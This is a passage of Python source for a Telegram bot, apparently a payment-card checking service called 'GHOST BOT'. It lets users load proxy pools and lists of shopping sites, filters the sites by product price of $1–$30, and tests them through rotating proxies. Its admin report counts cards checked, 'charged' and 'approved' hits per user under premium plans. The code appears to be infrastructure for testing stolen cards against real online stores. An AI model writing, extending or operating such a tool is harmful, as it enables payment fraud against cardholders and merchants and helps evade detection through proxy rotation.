                premium_emoji(f"❌ <b>Pʀᴏxʏ Lɪᴍɪᴛ Rᴇᴀᴄʜᴇᴅ (10000/10000)!</b>\n\nPʟᴇᴀsᴇ ʀᴜɴ <code>/proxy</code> ᴛᴏ ᴄʟᴇᴀɴ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."),
                parse_mode='html'
            )
            return

        available_slots = 200 - current_count
        to_test = list(dict.fromkeys(proxies_to_add))[:available_slots]
        
        status_msg = await event.reply(
            premium_emoji(f"🔄 <b>Tᴇsᴛɪɴɢ {len(to_test)} ᴘʀᴏxɪᴇs...</b>\n\n⏳ Pʀᴏɢʀᴇss: 0/{len(to_test)}\n✅ Aʟɪᴠᴇ: 0\n❌ Dᴇᴀᴅ: 0"),
            parse_mode='html'
        )

        alive_proxies = []
        dead_proxies = []
        semaphore = asyncio.Semaphore(20)
        checked_count = 0
        lock = asyncio.Lock()
        last_edit_time = 0

        async def check_p(p):
            nonlocal checked_count, last_edit_time
            try:
                async with semaphore:
                    res = await test_proxy(p)
                async with lock:
                    checked_count += 1
                    if res['status'] == 'alive':
                        alive_proxies.append(res['proxy'])
                    else:
                        dead_proxies.append(res['proxy'])
                        
                    import time
                    now = time.time()
                    if (now - last_edit_time >= 4.0) or checked_count == len(to_test):
                        last_edit_time = now
                        try:
                            await safe_edit(status_msg, 
                                premium_emoji(f"🔄 <b>Tᴇsᴛɪɴɢ ᴘʀᴏxɪᴇs...</b>\n\n⏳ Pʀᴏɢʀᴇss: {checked_count}/{len(to_test)}\n✅ Aʟɪᴠᴇ: {len(alive_proxies)}\n❌ Dᴇᴀᴅ: {len(dead_proxies)}"),
                                parse_mode='html'
                            )
                        except:
                            pass
            except Exception:
                async with lock:
                    checked_count += 1
                    dead_proxies.append(p)

        tasks = [check_p(p) for p in to_test]
        await asyncio.gather(*tasks)

        added = await db_manager.add_user_proxies(user_id, alive_proxies, max_limit=200)
        total_now = await db_manager.count_user_proxies(user_id)

        result_text = f"""✅ <b>Pʀᴏxʏ Cʜᴇᴄᴋ & Aᴅᴅ Cᴏᴍᴘʟᴇᴛᴇ!</b>

📊 <b>Rᴇsᴜʟᴛs:</b>
   ┣ ✅ Aʟɪᴠᴇ (Aᴅᴅᴇᴅ): {added}
   ┣ ❌ Dᴇᴀᴅ (Iɢɴᴏʀᴇᴅ): {len(dead_proxies)}
   ┗ 📁 Tᴏᴛᴀʟ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ: {total_now}/200"""

        await safe_edit(status_msg, premium_emoji(result_text), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/proxy(?:\s|$)'))
async def check_proxies_command(event):
    user_id = event.sender_id
    proxies = await db_manager.get_user_proxies(user_id)
    
    # Fallback to global for admin if admin has no private proxies
    if not proxies and user_id in ADMIN_ID:
        proxies = await get_file_lines(PROXY_FILE)
        
    if not proxies:
        await event.reply(
            premium_emoji("❌ <b>Nᴏ ᴘʀᴏxɪᴇs ғᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ!</b>\n\nUsᴇ <code>/addproxy</code> ᴛᴏ ᴀᴅᴅ ʏᴏᴜʀ ᴘʀᴏxɪᴇs (ᴜᴘ ᴛᴏ 200)."),
            parse_mode='html'
        )
        return

    status_msg = await event.reply(
        premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ {len(proxies)} ᴘʀᴏxɪᴇs...</b>\n\n⏳ Pʀᴏɢʀᴇss: 0/{len(proxies)}\n✅ Aʟɪᴠᴇ: 0\n❌ Dᴇᴀᴅ: 0"),
        parse_mode='html'
    )

    alive_proxies = []
    dead_proxies = []
    semaphore = asyncio.Semaphore(20)
    checked_count = 0
    lock = asyncio.Lock()
    last_edit_time = 0

    try:
        async def check_p(p):
            nonlocal checked_count, last_edit_time
            try:
                async with semaphore:
                    res = await test_proxy(p)
                async with lock:
                    checked_count += 1
                    if res['status'] == 'alive':
                        alive_proxies.append(res['proxy'])
                    else:
                        dead_proxies.append(res['proxy'])
                    import time
                    now = time.time()
                    if (now - last_edit_time >= 4.0) or checked_count == len(proxies):
                        last_edit_time = now
                        try:
                            await safe_edit(status_msg, 
                                premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxɪᴇs...</b>\n\n⏳ Pʀᴏɢʀᴇss: {checked_count}/{len(proxies)}\n✅ Aʟɪᴠᴇ: {len(alive_proxies)}\n❌ Dᴇᴀᴅ: {len(dead_proxies)}"),
                                parse_mode='html'
                            )
                        except:
                            pass
            except Exception:
                async with lock:
                    checked_count += 1
                    dead_proxies.append(p)

        tasks = [check_p(p) for p in proxies]
        await asyncio.gather(*tasks)

        # Update database with alive proxies
        await db_manager.clear_user_proxies(user_id)
        await db_manager.add_user_proxies(user_id, alive_proxies, max_limit=200)

        await safe_edit(status_msg, 
            premium_emoji(f"✅ <b>Pʀᴏxʏ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ!</b>\n\n📊 Tᴏᴛᴀʟ: {len(proxies)}\n✅ Aʟɪᴠᴇ: {len(alive_proxies)}\n❌ Rᴇᴍᴏᴠᴇᴅ: {len(dead_proxies)}\n📁 Cᴜʀʀᴇɴᴛ Pᴏᴏʟ: {len(alive_proxies)}/200"),
            parse_mode='html'
        )

    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    proxy_raw = event.message.text.split(' ', 1)[1].strip()
    parsed = parse_proxy_line(proxy_raw)
    if not parsed:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/chkproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxʏ: <code>{parsed}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(parsed)
        if result['status'] == 'alive':
            await safe_edit(status_msg, premium_emoji(f"✅ <b>Pʀᴏxʏ ɪs ALIVE!</b>\n\n<code>{parsed}</code>"), parse_mode='html')
        else:
            await safe_edit(status_msg, premium_emoji(f"❌ <b>Pʀᴏxʏ ɪs DEAD!</b>\n\n<code>{parsed}</code>"), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/getsites'))
async def get_all_sites(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    current_sites = await load_sites()
    if not current_sites:
        await event.reply(premium_emoji("❌ Nᴏ sɪᴛᴇs ɪɴ sɪᴛᴇs.ᴛxᴛ"), parse_mode='html')
        return
    if len(current_sites) <= 50:
        site_list = "\n".join(
            [f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_sites)])
        await event.reply(premium_emoji(f"📋 Aʟʟ Sɪᴛᴇs ({len(current_sites)}):\n\n{site_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sites_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for site in current_sites:
                await f.write(f"{site}\n")
        await event.reply(premium_emoji(f"📋 Aʟʟ Sɪᴛᴇs ({len(current_sites)}):\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass



async def process_user_sites_check(event_or_msg, user_id, sites_list, min_price, max_price):
    """Process site checking for user with price filter."""
    try:
        proxies = await db_manager.get_user_proxies(user_id)
        if not proxies and user_id in ADMIN_ID:
            proxies = await get_file_lines(PROXY_FILE)
            
        if not proxies:
            await event_or_msg.edit(
                premium_emoji("❌ <b>Nᴏ ᴘʀᴏxɪᴇs ғᴏᴜɴᴅ!</b>\n\nYᴏᴜ ᴍᴜsᴛ ᴀᴅᴅ ᴘʀᴏxɪᴇs ғɪʀsᴛ ᴜsɪɴɢ <code>/addproxy</code> ʙᴇғᴏʀᴇ ᴄʜᴇᴄᴋɪɴɢ sɪᴛᴇs."),
                parse_mode='html'
            )
            return

        current_count = await db_manager.count_user_sites(user_id)
        available_slots = max(0, 10000 - current_count)
        if available_slots <= 0:
            await event_or_msg.edit(
                premium_emoji("❌ <b>Sɪᴛᴇ Lɪᴍɪᴛ Rᴇᴀᴄʜᴇᴅ (200/200)!</b>\n\nUsᴇ <code>/site</code> ᴛᴏ ᴄʟᴇᴀɴ ᴅᴇᴀᴅ sɪᴛᴇs ᴏʀ <code>/rm</code> ᴛᴏ ʀᴇᴍᴏᴠᴇ."),
                parse_mode='html'
            )
            return

        to_check = list(dict.fromkeys(sites_list))
        status_msg = event_or_msg
        await safe_edit(status_msg, 
            premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ {len(to_check)} sɪᴛᴇs (Fɪʟᴛᴇʀ: ${min_price:g} - ${max_price:g})...</b>\n\n⏳ Pʀᴏɢʀᴇss: 0/{len(to_check)}\n✅ Aʟɪᴠᴇ (Iɴ Rᴀɴɢᴇ): 0\n❌ Dᴇᴀᴅ/Oᴜᴛ ᴏғ Rᴀɴɢᴇ: 0"),
            parse_mode='html'
        )

        alive_sites = []
        dead_sites = []
        sites_with_price = []
        semaphore = asyncio.Semaphore(25)
        checked_count = 0
        lock = asyncio.Lock()
        last_edit_time = 0

        async def check_s(site):
            nonlocal checked_count, last_edit_time
            try:
                async with semaphore:
                    proxy = random.choice(proxies)
                    res = await test_site_with_price(site, proxy)
                
                async with lock:
                    checked_count += 1
                    p_val = res.get('price', 0.0)
                    if res['status'] == 'alive' and (min_price <= p_val <= max_price or (min_price == 0 and p_val == 0)):
                        alive_sites.append(site)
                        sites_with_price.append({'url': site, 'price': p_val})
                    else:
                        dead_sites.append(site)
                    
                    import time
                    now = time.time()
                    if (now - last_edit_time >= 4.0) or checked_count == len(to_check):
                        last_edit_time = now
                        try:
                            await safe_edit(status_msg, 
                                premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs (Fɪʟᴛᴇʀ: ${min_price:g} - ${max_price:g})...</b>\n\n⏳ Pʀᴏɢʀᴇss: {checked_count}/{len(to_check)}\n✅ Aʟɪᴠᴇ: {len(alive_sites)}\n❌ Dᴇᴀᴅ/Sᴋɪᴘᴘᴇᴅ: {len(dead_sites)}"),
                                parse_mode='html'
                            )
                        except Exception:
                            pass
            except Exception:
                async with lock:
                    checked_count += 1
                    dead_sites.append(site)

        tasks = [check_s(s) for s in to_check]
        await asyncio.gather(*tasks)

        # Save to database
        added = await db_manager.add_user_sites(user_id, sites_with_price, max_limit=200)
        total_sites = await db_manager.count_user_sites(user_id)

        preview = "\n".join(alive_sites[:20])
        more = f"\n...and {len(alive_sites) - 20} more" if len(alive_sites) > 20 else ""
        
        await safe_edit(status_msg, 
            premium_emoji(f"""✅ <b>Sɪᴛᴇs Uᴘᴅᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ!</b>

📊 <b>Rᴇsᴜʟᴛs:</b>
   ┣ 📥 Tᴏᴛᴀʟ Rᴇᴄᴇɪᴠᴇᴅ: {len(to_check)}
   ┣ 🎯 Pʀɪᴄᴇ Rᴀɴɢᴇ: ${min_price:g} – ${max_price:g}
   ┣ ✅ Aʟɪᴠᴇ & Aᴅᴅᴇᴅ: {added}
   ┣ ❌ Dᴇᴀᴅ / Oᴜᴛ ᴏғ Rᴀɴɢᴇ: {len(dead_sites)}
   ┗ 📁 Tᴏᴛᴀʟ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ: {total_sites}/200

🌐 <b>Aᴅᴅᴇᴅ Sɪᴛᴇs:</b>
<code>{preview}</code>{more}"""),
            parse_mode='html'
        )
    except Exception as e:
        await event_or_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/(addsites|addsite)(?:\s+([\s\S]+))?'))
async def add_sites_command(event):
    user_id = event.sender_id
    try:
        raw_text = event.pattern_match.group(2)
        sites_to_add = []
        
        # 1. Check reply to txt file
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.file and reply_msg.file.name.endswith('.txt'):
                file_path = await reply_msg.download_media()
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    file_content = await f.read()
                    sites_to_add = [line.strip() for line in file_content.splitlines() if line.strip() and '.' in line]
                try:
                    os.remove(file_path)
                except:
                    pass
            elif reply_msg and reply_msg.text:
                for line in reply_msg.text.splitlines():
                    line = line.strip()
                    if line and '.' in line:
                        sites_to_add.append(line)

        # 2. Check text after command
        if not sites_to_add and raw_text:
            for line in raw_text.splitlines():
                line = line.strip()
                if line and '.' in line:
                    sites_to_add.append(line)
                    
        # 3. Check whole message lines if multiline
        if not sites_to_add:
            msg_lines = event.message.text.splitlines()
            if len(msg_lines) > 1:
                for line in msg_lines[1:]:
                    line = line.strip()
                    if line and '.' in line:
                        sites_to_add.append(line)

        if not sites_to_add:
            await event.reply(
                premium_emoji("📝 <b>Usᴀɢᴇ:</b>\n\n1. Rᴇᴘʟʏ ᴛᴏ ᴀ <code>.txt</code> ғɪʟᴇ ᴡɪᴛʜ <code>/addsites</code>\n2. Oʀ sᴇɴᴅ:\n<code>/addsites\nhttps://site1.com\nhttps://site2.com</code>"),
                parse_mode='html'
            )
            return

        proxies = await db_manager.get_user_proxies(user_id)
        if not proxies and user_id in ADMIN_ID:
            proxies = await get_file_lines(PROXY_FILE)
            
        if len(proxies) < 10 and user_id not in ADMIN_ID:
            await event.reply(
                premium_emoji(f"⚠️ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Pʀᴏxɪᴇs!</b>\n\nYᴏᴜ ᴍᴜsᴛ ʜᴀᴠᴇ ᴀᴛ ʟᴇᴀsᴛ <b>10</b> ᴡᴏʀᴋɪɴɢ ᴘʀᴏxɪᴇs ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ ʙᴇғᴏʀᴇ ᴀᴅᴅɪɴɢ sɪᴛᴇs.\n📊 Cᴜʀʀᴇɴᴛ: <code>{len(proxies)}/10</code>\n\nUsᴇ <code>/addproxy</code> ᴛᴏ ᴀᴅᴅ ᴍᴏʀᴇ."),
                parse_mode='html'
            )
            return

        current_sites_count = await db_manager.count_user_sites(user_id)
        if current_sites_count >= 200:
            await event.reply(
                premium_emoji("❌ <b>Sɪᴛᴇ Lɪᴍɪᴛ Rᴇᴀᴄʜᴇᴅ (200/200)!</b>\n\nPʟᴇᴀsᴇ ʀᴜɴ <code>/site</code> ᴛᴏ ᴄʟᴇᴀɴ ᴅᴇᴀᴅ sɪᴛᴇs ᴏʀ <code>/rm</code> ᴛᴏ ʀᴇᴍᴏᴠᴇ."),
                parse_mode='html'
            )
            return

        clean_sites = []
        for s in sites_to_add:
            if not s.startswith('http'):
                s = f'https://{s}'
            clean_sites.append(s)
            
        clean_sites = list(dict.fromkeys(clean_sites))
        PENDING_SITE_UPLOADS[user_id] = {'sites': clean_sites, 'time': time.time()}

        buttons = [
            [
                Button.inline("💰 $1 – $20", data=b"sitefilter_1_20"),
                Button.inline("💰 $1 – $30", data=b"sitefilter_1_30")
            ],
            [
                Button.inline("🎯 All (≤ $30)", data=b"sitefilter_all_30"),
                Button.inline("✏️ Custom Range", data=b"sitefilter_custom")
            ]
        ]

        await event.reply(
            premium_emoji(f"""🌐 <b>Sɪᴛᴇs Rᴇᴄᴇɪᴠᴇᴅ: {len(clean_sites)} sɪᴛᴇs</b>

Sᴇʟᴇᴄᴛ ʏᴏᴜʀ <b>Pʀɪᴄᴇ Rᴀɴɢᴇ Fɪʟᴛᴇʀ</b> ᴛᴏ sᴀᴠᴇ:
<i>(Nᴏᴛᴇ: $1 ɪɴᴄʟᴜᴅᴇs ғʀᴀᴄᴛɪᴏɴᴀʟ ᴘʀɪᴄᴇs ʟɪᴋᴇ $0.50)</i>"""),
            buttons=buttons,
            parse_mode='html'
        )

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=r'^sitefilter_'))
async def on_site_filter_callback(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    pending = PENDING_SITE_UPLOADS.get(user_id)
    if not pending or not pending.get('sites'):
        await event.answer("⚠️ Session expired or no pending sites. Please run /addsites again.", alert=True)
        return
        
    sites_list = pending['sites']
    
    if data == "sitefilter_1_20":
        await event.answer()
        await process_user_sites_check(event, user_id, sites_list, 0.0, 20.0)
        PENDING_SITE_UPLOADS.pop(user_id, None)
    elif data == "sitefilter_1_30":
        await event.answer()
        await process_user_sites_check(event, user_id, sites_list, 0.0, 30.0)
        PENDING_SITE_UPLOADS.pop(user_id, None)
    elif data == "sitefilter_all_30":
        await event.answer()
        await process_user_sites_check(event, user_id, sites_list, 0.0, 30.0)
        PENDING_SITE_UPLOADS.pop(user_id, None)
    elif data == "sitefilter_custom":
        pending['awaiting_custom'] = True
        await safe_edit(event, 
            premium_emoji("""✏️ <b>Cᴜsᴛᴏᴍ Pʀɪᴄᴇ Rᴀɴɢᴇ</b>

Pʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ ᴅᴇsɪʀᴇᴅ ʀᴀɴɢᴇ ɪɴ ғᴏʀᴍᴀᴛ:
<code>min-max</code> <i>(ᴇ.ɢ. <code>2-15</code> ᴏʀ <code>0.5-25</code>, ᴍᴀx $30)</i>:"""),
            parse_mode='html'
        )


@bot.on(events.NewMessage)
async def on_custom_price_input(event):
    user_id = event.sender_id
    pending = PENDING_SITE_UPLOADS.get(user_id)
    if not pending or not pending.get('awaiting_custom'):
        return
        
    text = event.message.text.strip()
    match = re.match(r'^(\d+(?:\.\d+)?)\s*-\s*(\d+(?:\.\d+)?)$', text)
    if not match:
        return
        
    min_p = float(match.group(1))
    max_p = float(match.group(2))
    
    if max_p > 30.0:
        await event.reply(premium_emoji("⚠️ Mᴀxɪᴍᴜᴍ ᴀʟʟᴏᴡᴇᴅ ᴘʀɪᴄᴇ ɪs $30. Cᴀᴘᴘɪɴɢ ʀᴀɴɢᴇ ᴛᴏ $30."), parse_mode='html')
        max_p = 30.0
        
    if min_p > max_p:
        min_p, max_p = max_p, min_p
        
    pending['awaiting_custom'] = False
    sites_list = pending['sites']
    PENDING_SITE_UPLOADS.pop(user_id, None)
    
    status_msg = await event.reply(premium_emoji("🔄 Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ sɪᴛᴇs..."), parse_mode='html')
    await process_user_sites_check(status_msg, user_id, sites_list, min_p, max_p)


@bot.on(events.NewMessage(pattern=r'^/(site|chksites|cleansites)(?:\s|$)'))
async def site_command(event):
    user_id = event.sender_id
    sites_with_p = await db_manager.get_all_user_sites(user_id)
    
    if not sites_with_p and user_id in ADMIN_ID:
        global_s = await get_file_lines(SITES_FILE)
        sites_with_p = [{'url': s, 'price': 0.0} for s in global_s]
        
    if not sites_with_p:
        await event.reply(
            premium_emoji("❌ <b>Nᴏ sɪᴛᴇs ғᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ!</b>\n\nUsᴇ <code>/addsites</code> ᴛᴏ ᴀᴅᴅ sɪᴛᴇs (ᴜᴘ ᴛᴏ 10000)."),
            parse_mode='html'
        )
        return
        
    proxies = await db_manager.get_user_proxies(user_id)
    if not proxies and user_id in ADMIN_ID:
        proxies = await get_file_lines(PROXY_FILE)
        
    if not proxies:
        await event.reply(
            premium_emoji("❌ <b>Nᴏ ᴘʀᴏxɪᴇs ғᴏᴜɴᴅ!</b>\n\nPʟᴇᴀsᴇ ᴀᴅᴅ ᴘʀᴏxɪᴇs ᴜsɪɴɢ <code>/addproxy</code> ʙᴇғᴏʀᴇ ᴄʜᴇᴄᴋɪɴɢ sɪᴛᴇs."),
            parse_mode='html'
        )
        return
        
    status_msg = await event.reply(
        premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ {len(sites_with_p)} sɪᴛᴇs...</b>\n\n⏳ Pʀᴏɢʀᴇss: 0/{len(sites_with_p)}\n✅ Aʟɪᴠᴇ: 0\n❌ Dᴇᴀᴅ: 0"),
        parse_mode='html'
    )
    
    alive_sites = []
    dead_sites = []
    alive_with_price = []
    semaphore = asyncio.Semaphore(25)
    checked_count = 0
    lock = asyncio.Lock()
    last_edit_time = 0
    
    try:
        async def check_site_async(site_item):
            nonlocal checked_count, last_edit_time
            site_url = site_item['url']
            try:
                async with semaphore:
                    proxy = random.choice(proxies)
                    res = await test_site_with_price(site_url, proxy)
                    
                async with lock:
                    checked_count += 1
                    if res['status'] == 'alive':
                        alive_sites.append(site_url)
                        alive_with_price.append({'url': site_url, 'price': res.get('price', 0.0)})
                    else:
                        dead_sites.append(site_url)
                        
                    import time
                    now = time.time()
                    if (now - last_edit_time >= 4.0) or checked_count == len(sites_with_p):
                        last_edit_time = now
                        try:
                            await safe_edit(status_msg, 
                                premium_emoji(f"🔄 <b>Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs ᴡɪᴛʜ {len(API_SERVERS)} API Rᴇᴘʟɪᴄᴀs...</b>\n\n⏳ Pʀᴏɢʀᴇss: {checked_count}/{len(sites_with_p)}\n✅ Aʟɪᴠᴇ: {len(alive_sites)}\n❌ Dᴇᴀᴅ: {len(dead_sites)}"),
                                parse_mode='html'
                            )
                        except Exception:
                            pass
            except Exception:
                async with lock:
                    checked_count += 1
                    dead_sites.append(site_url)

        tasks = [check_site_async(s) for s in sites_with_p]
        await asyncio.gather(*tasks)

        # Update DB for user
        await db_manager.clear_user_sites(user_id)
        await db_manager.add_user_sites(user_id, alive_with_price, max_limit=200)

        preview = "\n".join(alive_sites[:20])
        more = f"\n...and {len(alive_sites) - 20} more" if len(alive_sites) > 20 else ""

        await safe_edit(status_msg, 
            premium_emoji(f"""✅ <b>Sɪᴛᴇ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ!</b>

📊 <b>Rᴇsᴜʟᴛs:</b>
   ┣ 📁 Tᴏᴛᴀʟ: {len(sites_with_p)}
   ┣ ✅ Aʟɪᴠᴇ: {len(alive_sites)}
   ┣ ❌ Rᴇᴍᴏᴠᴇᴅ: {len(dead_sites)}
   ┗ 📁 Cᴜʀʀᴇɴᴛ Pᴏᴏʟ: {len(alive_sites)}/200

🌐 <b>Aʟɪᴠᴇ Sɪᴛᴇs:</b>
<code>{preview}</code>{more}"""),
            parse_mode='html'
        )
    except Exception as e:
        try:
            await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        except:
            pass


@bot.on(events.NewMessage(pattern=r'^/(getsites|mysites|exportsites)(?:\s|$)'))
async def get_sites_command(event):
    user_id = event.sender_id
    sites_with_p = await db_manager.get_all_user_sites(user_id)
    if not sites_with_p and user_id in ADMIN_ID:
        global_s = await get_file_lines(SITES_FILE)
        sites_with_p = [{'url': s, 'price': 0.0} for s in global_s]
        
    if not sites_with_p:
        await event.reply(
            premium_emoji("❌ <b>Nᴏ sɪᴛᴇs ғᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ!</b>\n\nUsᴇ <code>/addsites</code> ᴛᴏ ᴀᴅᴅ sɪᴛᴇs."),
            parse_mode='html'
        )
        return
        
    filename = f"sites_{user_id}.txt"
    try:
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for s in sites_with_p:
                await f.write(f"{s['url']}\n")
                
        await event.reply(
            premium_emoji(f"📁 <b>Yᴏᴜʀ Sᴀᴠᴇᴅ Sɪᴛᴇs ({len(sites_with_p)}):</b>\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."),
            file=filename,
            parse_mode='html'
        )
    finally:
        if os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass


@bot.on(events.NewMessage(pattern=r'^/(getproxy|getproxies|myproxy|myproxies|exportproxy)(?:\s|$)'))
async def get_proxy_command(event):
    user_id = event.sender_id
    proxies = await db_manager.get_user_proxies(user_id)
    if not proxies and user_id in ADMIN_ID:
        proxies = await get_file_lines(PROXY_FILE)
        
    if not proxies:
        await event.reply(
            premium_emoji("❌ <b>Nᴏ ᴘʀᴏxɪᴇs ғᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ!</b>\n\nUsᴇ <code>/addproxy</code> ᴛᴏ ᴀᴅᴅ ᴘʀᴏxɪᴇs."),
            parse_mode='html'
        )
        return
        
    filename = f"proxies_{user_id}.txt"
    try:
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for p in proxies:
                await f.write(f"{p}\n")
                
        await event.reply(
            premium_emoji(f"📁 <b>Yᴏᴜʀ Sᴀᴠᴇᴅ Pʀᴏxɪᴇs ({len(proxies)}):</b>\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."),
            file=filename,
            parse_mode='html'
        )
    finally:
        if os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass


@bot.on(events.NewMessage(pattern=r'^/(users|allusers|userstats)(?:\s|$)'))
async def all_users_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
        
    status_msg = await event.reply(premium_emoji("🔄 <b>Gᴀᴛʜᴇʀɪɴɢ ᴜsᴇʀs ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛs...</b>"), parse_mode='html')
    try:
        users = await db_manager.get_all_users_detailed()
        total_users = len(users)
        prem_users = [u for u in users if u['is_premium'] == 1]
        banned_users = [u for u in users if u['is_banned']]
        free_users = total_users - len(prem_users) - len(banned_users)
        
        total_sites = sum(u['sites_count'] for u in users)
        total_proxies = sum(u['proxies_count'] for u in users)
        total_checked = sum(u['total_cards'] for u in users)
        total_charged = sum(u['charged'] for u in users)
        total_approved = sum(u['approved'] for u in users)
        
        report_text = f"""📊 <b>Usᴇʀs Dᴀᴛᴀʙᴀsᴇ Oᴠᴇʀᴠɪᴇᴡ</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Tᴏᴛᴀʟ Bᴏᴛ Usᴇʀs:</b> <code>{total_users}</code>
⭐ <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs:</b> <code>{len(prem_users)}</code>
🆓 <b>Fʀᴇᴇ Usᴇʀs:</b> <code>{max(0, free_users)}</code>
🚫 <b>Bᴀɴɴᴇᴅ Usᴇʀs:</b> <code>{len(banned_users)}</code>

🌐 <b>Uᴛɪʟɪᴢᴀᴛɪᴏɴ Aᴄʀᴏss Aʟʟ Usᴇʀs:</b>
┣ 📂 Tᴏᴛᴀʟ Sɪᴛᴇs Aᴅᴅᴇᴅ: <code>{total_sites}</code>
┣ ⚡ Tᴏᴛᴀʟ Pʀᴏxɪᴇs Aᴅᴅᴇᴅ: <code>{total_proxies}</code>
┣ 💳 Tᴏᴛᴀʟ Cᴀʀᴅs Cʜᴇᴄᴋᴇᴅ: <code>{total_checked}</code>
┣ 💎 Tᴏᴛᴀʟ Cʜᴀʀɢᴇᴅ: <code>{total_charged}</code>
┗ ✅ Tᴏᴛᴀʟ Aᴘᴘʀᴏᴠᴇᴅ: <code>{total_approved}</code>

📄 <i>Fᴜʟʟ ᴜsᴇʀs ʙʀᴇᴀᴋᴅᴏᴡɴ ʀᴇᴘᴏʀᴛ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ.</i>
💡 <i>Tɪᴘ: Usᴇ <code>/user &lt;id&gt;</code> ᴛᴏ ɪɴsᴘᴇᴄᴛ ᴀ sᴘᴇᴄɪғɪᴄ ᴜsᴇʀ.</i>"""

        # Build detailed text file
        report_filename = "all_users_detailed_report.txt"
        async with aiofiles.open(report_filename, 'w', encoding='utf-8') as f:
            header = f"{'USER ID':<15} | {'PLAN':<10} | {'EXPIRY':<20} | {'SITES':<7} | {'PROXIES':<7} | {'CHECKED':<8} | {'HITS':<6} | {'HIT%':<6} | {'STATUS'}\n"
            await f.write("GHOST BOT - ALL USERS COMPREHENSIVE REPORT\n")
            await f.write(f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            await f.write(f"Total Users: {total_users} | Premium: {len(prem_users)} | Banned: {len(banned_users)}\n")
            await f.write("=" * 105 + "\n")
            await f.write(header)
            await f.write("=" * 105 + "\n")
            
            for u in sorted(users, key=lambda x: (x['is_premium'], x['sites_count'] + x['proxies_count']), reverse=True):
                status_str = "BANNED" if u['is_banned'] else ("PREMIUM" if u['is_premium'] else "FREE")
                exp_str = str(u['premium_expiry'])[:19] if u['premium_expiry'] else "N/A"
                hits = u['charged'] + u['approved']
                line = f"{u['user_id']:<15} | {u['plan']:<10} | {exp_str:<20} | {u['sites_count']:<7} | {u['proxies_count']:<7} | {u['total_cards']:<8} | {hits:<6} | {u['hit_rate']:<5}% | {status_str}\n"
                await f.write(line)
                
        await status_msg.delete()
        await event.reply(
            premium_emoji(report_text),
            file=report_filename,
            parse_mode='html'
        )
        try:
            if os.path.exists(report_filename):
                os.remove(report_filename)
        except:
            pass
            
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/user(?:\s+(\d+))?$'))
